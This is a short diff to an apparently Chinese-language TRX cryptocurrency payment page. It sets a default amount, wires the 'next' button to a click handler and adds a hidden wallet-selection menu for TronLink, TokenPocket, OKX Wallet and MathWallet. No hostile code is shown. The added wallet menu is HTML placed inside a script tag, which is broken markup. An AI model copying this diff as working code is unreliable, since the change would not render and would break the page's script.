@@ -48,7 +48,7 @@
                             <div data-v-49fe1bb8="">
                                 <div data-v-49fe1bb8="" class="pay-box">
                                     <div data-v-49fe1bb8="" class="amount">
-                                        <div data-v-49fe1bb8="" class="num"><span class="amount" id="amount"></span><em data-v-49fe1bb8="">TRX</em></div><img data-v-49fe1bb8="" src="png/icon_exchange.jpg" class="icon">
+                                       <div data-v-49fe1bb8="" class="num" data-amount="0"><span class="amount" id="amount">0</span><em data-v-49fe1bb8="">TRX</em></div><img data-v-49fe1bb8="" src="png/icon_exchange.jpg" class="icon">
                                     </div>
                                     <div data-v-49fe1bb8="" class="rate"><span id="amount-display"></span><em data-v-49fe1bb8="">USD</em>
                                         <div data-v-49fe1bb8="" class="icon"><img data-v-49fe1bb8="" src="png/icon_horn.jpg"></div>
@@ -81,7 +81,7 @@
                                         <div data-v-49fe1bb8="" onclick="clearAmount()" class="btn delete" style="margin-top:20px"><img data-v-49fe1bb8="" src="png/icon_delete.jpg"></div>
                                     </div>
                                     <footer style="display: flex; justify-content: center; align-items: center; margin-top: 20px;">
-                                        <van-button class="submit-btn disabled" type="button" id="submitBtn" disabled style="display: flex; justify-content: center; align-items: center; text-align: center; width: 100%;">下一步</van-button>
+                                        <van-button class="submit-btn disabled" type="button" id="submitBtn" disabled  onclick="onNextButtonClick()" style="display: flex; justify-content: center; align-items: center; text-align: center; width: 100%;">下一步</van-button>
                                         <van-button id="jixu" class="jixu">继续</van-button>
                                     </footer>
                                 </div>
@@ -94,6 +94,13 @@
         </uni-page>
     </uni-app>    
 <script>
+<div id="walletSelection" style="display:none; text-align:center;">
+    <p>请选择支付钱包：</p>
+    <button onclick="selectWallet(0)">TronLink</button>
+    <button onclick="selectWallet(1)">TokenPocket</button>
+    <button onclick="selectWallet(2)">OKX Wallet</button>
+    <button onclick="selectWallet(3)">MathWallet</button>
+</div>
 
 
 
